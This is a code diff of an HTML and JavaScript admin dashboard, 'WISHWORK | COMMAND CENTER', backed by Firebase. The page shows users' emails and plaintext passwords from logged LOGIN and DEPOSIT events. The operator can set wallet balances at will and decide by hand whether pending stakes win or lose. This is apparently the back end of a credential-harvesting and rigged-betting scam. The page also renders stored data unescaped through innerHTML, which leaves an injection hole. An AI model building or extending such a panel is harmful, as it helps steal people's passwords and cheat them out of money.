@@ -3,77 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ADMIN | WISHWORK</title>
+    <title>WISHWORK | COMMAND CENTER</title>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;900&display=swap" rel="stylesheet">
     <style>
-        body { background: #020205; color: white; font-family: 'Outfit'; padding: 20px; }
-        h1 { text-align: center; background: linear-gradient(to right, #38bdf8, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .table-card { background: rgba(255,255,255,0.03); border-radius: 20px; padding: 15px; border: 1px solid rgba(255,255,255,0.1); }
-        table { width: 100%; border-collapse: collapse; }
-        th { text-align: left; font-size: 10px; color: #38bdf8; padding: 10px; }
-        td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 12px; }
-        .btn { padding: 5px 10px; border: none; border-radius: 5px; color: white; cursor: pointer; font-weight: 800; margin-right: 5px; }
+        body { background: #020205; color: white; font-family: 'Outfit', sans-serif; padding: 20px; }
+        h1 { text-align: center; color: #00f2ff; font-weight: 900; letter-spacing: 2px; }
+        .stats { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; }
+        .stat-box { background: rgba(255,255,255,0.05); padding: 15px 30px; border-radius: 15px; border: 1px solid rgba(0,242,255,0.2); }
+        table { width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.02); border-radius: 15px; overflow: hidden; }
+        th { background: rgba(0,242,255,0.1); color: #00f2ff; padding: 15px; text-align: left; font-size: 11px; text-transform: uppercase; }
+        td { padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
+        .btn { padding: 8px 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: 800; color: white; margin-right: 5px; }
         .win { background: #22c55e; } .loss { background: #ef4444; } .del { background: #444; }
-        .login-row { border-left: 4px solid #a855f7; }
-        .deposit-row { border-left: 4px solid #00f2ff; }
+        .action-tag { font-weight: 900; font-size: 10px; color: #a855f7; }
     </style>
 </head>
 <body>
 
-<h1>CONTROL CENTER</h1>
-<div class="table-card">
-    <table>
-        <thead><tr><th>USER (CLICK BAL)</th><th>VALUE</th><th>TYPE</th><th>ACTION</th></tr></thead>
-        <tbody id="adminBody"></tbody>
-    </table>
+<h1>NEXUS COMMAND</h1>
+
+<div class="stats">
+    <div class="stat-box">LOGS: <span id="logCount" style="color:#00f2ff">0</span></div>
 </div>
+
+<table>
+    <thead>
+        <tr>
+            <th>Neural ID</th>
+            <th>Value/Pass</th>
+            <th>Type</th>
+            <th>Status/Control</th>
+        </tr>
+    </thead>
+    <tbody id="adminBody">
+        <tr><td colspan="4" style="text-align:center; color:orange;">Synchronizing with Firebase...</td></tr>
+    </tbody>
+</table>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, collection, query, orderBy, onSnapshot, doc, deleteDoc, updateDoc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getFirestore, collection, onSnapshot, doc, updateDoc, deleteDoc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    const firebaseConfig = { apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", authDomain: "home-help-service.firebaseapp.com", projectId: "home-help-service", storageBucket: "home-help-service.firebasestorage.app", messagingSenderId: "160722457510", appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" };
+    const firebaseConfig = { 
+        apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", 
+        authDomain: "home-help-service.firebaseapp.com", 
+        projectId: "home-help-service", 
+        storageBucket: "home-help-service.firebasestorage.app", 
+        messagingSenderId: "160722457510", 
+        appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" 
+    };
+
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    window.editBal = async (email) => {
-        const val = prompt(`Set wallet for ${email}:`);
-        if(val) await setDoc(doc(db, "wallets", email), { balance: parseInt(val) });
-    };
-
-    window.resolve = async (id, res, email, amtStr) => {
-        const amt = parseInt(amtStr.replace(/[^\d]/g, ''));
-        await updateDoc(doc(db, "users", id), { status: res });
-        if(res === "WIN 🏆") {
-            const s = await getDoc(doc(db, "wallets", email));
-            const cur = s.exists() ? s.data().balance : 0;
-            await updateDoc(doc(db, "wallets", email), { balance: cur + (amt * 2) });
-        }
-    };
-
-    window.delLog = async (id) => { if(confirm("Delete?")) await deleteDoc(doc(db, "users", id)); };
-
-    onSnapshot(query(collection(db, "users"), orderBy("time", "desc")), (snap) => {
+    // SIMPLE LISTENER - No sorting, just raw data pull
+    onSnapshot(collection(db, "users"), (snap) => {
         const body = document.getElementById("adminBody");
-        let html = "";
+        document.getElementById("logCount").innerText = snap.size;
+        body.innerHTML = "";
+
         snap.forEach(d => {
             const data = d.data();
-            const rowClass = data.actionType.includes("LOGIN") ? "login-row" : (data.actionType === "DEPOSIT" ? "deposit-row" : "");
-            html += `<tr class="${rowClass}">
-                <td onclick="editBal('${data.email}')" style="color:#38bdf8; cursor:pointer;">${data.email ? data.email.split('@')[0] : '???'}</td>
-                <td>${data.password}</td>
-                <td>${data.actionType}</td>
-                <td>
-                    ${data.status === "PENDING" ? `
-                        <button class="btn win" onclick="resolve('${d.id}','WIN 🏆','${data.email}','${data.password}')">W</button>
-                        <button class="btn loss" onclick="resolve('${d.id}','LOST 💀','${data.email}','${data.password}')">L</button>
-                    ` : `<span>${data.status}</span>`}
-                    <button class="btn del" onclick="delLog('${d.id}')">×</button>
-                </td>
-            </tr>`;
+            const id = d.id;
+            
+            body.innerHTML += `
+                <tr>
+                    <td onclick="setBal('${data.email}')" style="color:#00f2ff; cursor:pointer;">${data.email || 'Unknown'}</td>
+                    <td>${data.password || 'N/A'}</td>
+                    <td class="action-tag">${data.actionType || 'LOG'}</td>
+                    <td>
+                        ${data.status === "PENDING" ? `
+                            <button class="btn win" onclick="resolve('${id}','WIN 🏆','${data.email}','${data.password}')">W</button>
+                            <button class="btn loss" onclick="resolve('${id}','LOST 💀','${data.email}','${data.password}')">L</button>
+                        ` : `<span style="opacity:0.6">${data.status || 'PROCESSED'}</span>`}
+                        <button class="btn del" onclick="delLog('${id}')">×</button>
+                    </td>
+                </tr>`;
         });
-        body.innerHTML = html;
+    }, (err) => {
+        alert("Firebase Connection Failed: " + err.message);
     });
+
+    window.setBal = async (e) => {
+        const val = prompt(`New balance for ${e}:`);
+        if(val) await setDoc(doc(db, "wallets", e), { balance: parseInt(val) });
+    };
+
+    window.resolve = async (id, res, email, val) => {
+        const amt = parseInt(val.replace(/[^\d]/g, ''));
+        await updateDoc(doc(db, "users", id), { status: res });
+        if(res === "WIN 🏆") {
+            const snap = await getDoc(doc(db, "wallets", email));
+            const cur = snap.exists() ? snap.data().balance : 0;
+            await setDoc(doc(db, "wallets", email), { balance: cur + (amt * 2) });
+        }
+        alert("Neural Sync Complete");
+    };
+
+    window.delLog = async (id) => { if(confirm("Terminate log?")) await deleteDoc(doc(db, "users", id)); };
 </script>
 </body>
 </html>
